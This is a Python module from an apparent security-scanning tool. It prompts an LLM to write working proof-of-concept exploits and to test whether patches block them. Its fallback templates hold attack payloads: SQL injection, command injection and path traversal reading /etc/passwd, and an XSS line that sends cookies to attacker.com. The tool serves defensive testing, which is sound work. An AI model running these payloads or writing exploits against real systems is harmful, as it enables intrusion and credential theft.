from langchain_groq import ChatGroq
from langchain_core.prompts import PromptTemplate
from langchain_core.output_parsers import StrOutputParser
from typing import Dict, Optional
import structlog
from config import settings

log = structlog.get_logger()

POC_PROMPT = PromptTemplate(
    input_variables=["vuln_type", "vulnerable_code", "file_path", "description"],
    template="""You are an expert penetration tester writing a proof-of-concept exploit.

Vulnerability Type: {vuln_type}
File: {file_path}
Description: {description}

Vulnerable Code:
```
{vulnerable_code}
```

Write a minimal, working proof-of-concept exploit that demonstrates this vulnerability is real and exploitable.
- Be specific to the actual code shown
- Show the exact payload or attack vector
- Include a brief comment explaining what it does
- Keep it under 20 lines
- Use Python, curl, or the most appropriate language

Return ONLY the exploit code, no explanation outside of code comments.
""",
)

FIX_VALIDATION_PROMPT = PromptTemplate(
    input_variables=["vuln_type", "patched_code", "poc_exploit"],
    template="""You are a security researcher testing whether a patch is effective.

Vulnerability Type: {vuln_type}

Patched Code:
```
{patched_code}
```

Original PoC Exploit:
```
{poc_exploit}
```

Try to bypass this patch. Does the original exploit still work against the patched code?
Answer with ONLY: "BYPASSED" or "BLOCKED"
Then on the next line explain in one sentence why.
""",
)


class PoCGenerator:
    def __init__(self):
        self.llm = ChatGroq(
            model=settings.GROQ_MODEL,
            api_key=settings.GROQ_API_KEY,
            temperature=0.2,
        )

    def generate_poc(self, finding: Dict) -> Optional[str]:
        try:
            chain = POC_PROMPT | self.llm | StrOutputParser()
            result = chain.invoke({
                "vuln_type": finding.get("vuln_type", "unknown"),
                "vulnerable_code": finding.get("vulnerable_code", ""),
                "file_path": finding.get("file_path", ""),
                "description": finding.get("description", ""),
            })
            log.info("PoC generated", vuln_type=finding.get("vuln_type"), file=finding.get("file_path"))
            return result.strip()
        except Exception as e:
            log.error("PoC generation failed", error=str(e))
            return self._fallback_poc(finding)

    def validate_patch(self, finding: Dict, patched_code: str, poc_exploit: str) -> Dict:
        try:
            chain = FIX_VALIDATION_PROMPT | self.llm | StrOutputParser()
            result = chain.invoke({
                "vuln_type": finding.get("vuln_type", ""),
                "patched_code": patched_code,
                "poc_exploit": poc_exploit,
            })
            lines = result.strip().split("\n")
            verdict = lines[0].strip().upper()
            reason = lines[1].strip() if len(lines) > 1 else ""
            blocked = verdict == "BLOCKED"
            return {"blocked": blocked, "verdict": verdict, "reason": reason}
        except Exception as e:
            log.error("Patch validation failed", error=str(e))
            return {"blocked": True, "verdict": "UNKNOWN", "reason": str(e)}

    def _fallback_poc(self, finding: Dict) -> str:
        """Return template PoC when LLM is unavailable."""
        templates = {
            "sqli": "# SQL Injection PoC\nimport requests\npayload = \"' OR 1=1 --\"\nresp = requests.get(f\"http://target/endpoint?id={payload}\")\nprint(resp.text)",
            "xss": "# XSS PoC\npayload = \"<script>document.location='http://attacker.com/steal?c='+document.cookie</script>\"\nprint(f\"Inject this payload: {payload}\")",
            "command_injection": "# Command Injection PoC\nimport requests\npayload = \"; cat /etc/passwd\"\nresp = requests.post(\"http://target/endpoint\", data={\"input\": payload})\nprint(resp.text)",
            "hardcoded_secret": "# Hardcoded Secret\n# Extract the credential from source and use it directly\n# E.g.: curl -H 'Authorization: Bearer <extracted_token>' http://target/api/admin",
            "path_traversal": "# Path Traversal PoC\nimport requests\nresp = requests.get(\"http://target/file?name=../../../../etc/passwd\")\nprint(resp.text)",
        }
        return templates.get(finding.get("vuln_type", ""), "# Manual exploitation required for this vulnerability type.")